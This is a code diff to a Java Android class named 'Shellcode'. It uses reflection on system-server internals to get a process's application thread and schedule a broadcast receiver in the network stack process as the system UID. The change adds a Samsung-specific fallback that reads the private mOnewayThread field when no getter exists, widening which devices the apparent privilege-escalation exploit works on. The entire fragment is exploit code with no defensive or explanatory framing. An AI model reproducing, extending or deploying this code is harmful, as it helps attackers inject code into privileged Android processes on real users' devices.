@@ -109,9 +109,18 @@ public class Shellcode extends BroadcastReceiver {
                     processRecordClass = m.getReturnType();
                 }
             }
-            Method getOnewayThread = findMethod(processRecordClass, "getOnewayThread");
-            getOnewayThread.setAccessible(true);
-            IApplicationThread appThread = (IApplicationThread) getOnewayThread.invoke(networkStackProcessRecord);
+            IApplicationThread appThread;
+            try {
+                Method getOnewayThread = findMethod(processRecordClass, "getOnewayThread");
+                getOnewayThread.setAccessible(true);
+                appThread = (IApplicationThread) getOnewayThread.invoke(networkStackProcessRecord);
+            } catch (NoSuchMethodException noGetter) {
+                /* Samsung (h8q): no getter; the IApplicationThread is the
+                 * mOnewayThread field on ProcessRecord. */
+                Field f = findField(processRecordClass, "mOnewayThread");
+                f.setAccessible(true);
+                appThread = (IApplicationThread) f.get(networkStackProcessRecord);
+            }
             appThread.scheduleReceiver(intent, receiverInfo, null, 0,
                     null, null, false, false, 0,
                     0, Process.SYSTEM_UID, "android");
